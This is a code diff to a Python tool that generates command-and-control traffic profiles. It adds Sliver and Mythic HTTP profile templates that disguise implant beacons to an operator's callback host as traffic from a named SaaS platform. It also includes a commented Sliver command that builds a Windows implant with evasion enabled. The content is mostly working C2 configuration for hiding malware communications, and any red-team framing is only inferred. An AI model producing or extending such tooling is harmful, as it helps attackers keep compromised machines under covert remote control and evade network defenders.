@@ -74,6 +74,8 @@ class C2Profile:
     platform: str
     havoc_profile: str
     cobalt_strike_profile: str
+    sliver_profile: str = ""
+    mythic_profile: str = ""
 
 
 def _havoc_profile(cfg: dict, lhost: str, lport: int) -> str:
@@ -186,6 +188,94 @@ https-post {{
 }}"""
 
 
+def _sliver_profile(cfg: dict, lhost: str, lport: int) -> str:
+    """
+    Sliver HTTP/S C2 traffic profile.
+
+    Sliver loads JSON traffic encoders / HTTP profiles via `implant http profile`.
+    The block below is the operator-side `sliver` console invocation plus the
+    profile JSON that customises the HTTP transport. Drop the JSON into the
+    `extensions` directory or use `c2profile --import`.
+    """
+    return f"""\
+# Sliver HTTP profile — {cfg['host']} mimicry
+# Generate the implant:
+#   sliver > generate --http {lhost}:{lport} --os windows --arch amd64 \\
+#       --evasion --skip-symbols --format exe --save ./implant.exe
+#
+# c2 profile JSON (save to ~/.sliver-client/configs/{cfg['host']}.json):
+{{
+  "implant_config": {{
+    "polling_interval": 5000,
+    "jitter": 20,
+    "max_connection_errors": 1000
+  }},
+  "http": {{
+    "user_agent": "{cfg['user_agent']}",
+    "url_parameters": {{
+      "session": "16,base64url"
+    }},
+    "headers": {{
+      "Host": "{cfg['host']}",
+      "Accept": "application/json, text/plain, */*",
+      "{cfg['x_header']}": "{cfg['x_header_val']}"
+    }},
+    "poll_paths": ["{cfg['get_uri']}"],
+    "session_paths": ["{cfg['post_uri']}"],
+    "close_paths": ["/api/v2/user/logout"],
+    "files": [
+      {{
+        "path": "/assets",
+        "ext": ".js",
+        "content_type": "application/javascript"
+      }}
+    ]
+  }}
+}}"""
+
+
+def _mythic_profile(cfg: dict, lhost: str, lport: int) -> str:
+    """
+    Mythic HTTP C2 profile YAML.
+
+    Mythic loads C2 profiles via the `c2_profiles/http/config.json` mount.
+    This template produces a config that mimics the named SaaS platform.
+    """
+    return f"""\
+# Mythic HTTP C2 profile — {cfg['host']} mimicry
+# Place in: Mythic/Mythic_CLI/c2_profiles/http/config.json
+{{
+  "instances": [
+    {{
+      "port": {lport},
+      "key_exchange": true,
+      "ConfigCheckSleep": 10,
+      "payloads": ["apollo", "merlin", "poseidon"],
+      "server_headers": {{
+        "Server": "nginx",
+        "Content-Type": "{cfg['content_type']}"
+      }},
+      "ssl": true,
+      "agent_config": {{
+        "headers": {{
+          "User-Agent": "{cfg['user_agent']}",
+          "Host": "{cfg['host']}",
+          "{cfg['x_header']}": "{cfg['x_header_val']}",
+          "Accept": "application/json, text/plain, */*"
+        }},
+        "post_uri": "{cfg['post_uri']}",
+        "get_uri": "{cfg['get_uri']}",
+        "callback_host": "https://{lhost}",
+        "callback_port": {lport},
+        "callback_interval": 5,
+        "callback_jitter": 20,
+        "encrypted_exchange_check": true
+      }}
+    }}
+  ]
+}}"""
+
+
 def generate_profile(platform: str, lhost: str, lport: int) -> C2Profile:
     if platform not in _PLATFORM_CONFIG:
         raise ValueError(f"Unknown platform '{platform}'. Supported: {', '.join(SUPPORTED_PLATFORMS)}")
@@ -198,4 +288,6 @@ def generate_profile(platform: str, lhost: str, lport: int) -> C2Profile:
         platform=platform,
         havoc_profile=_havoc_profile(cfg, lhost, lport),
         cobalt_strike_profile=_cs_profile(cfg, lhost, lport),
+        sliver_profile=_sliver_profile(cfg, lhost, lport),
+        mythic_profile=_mythic_profile(cfg, lhost, lport),
     )
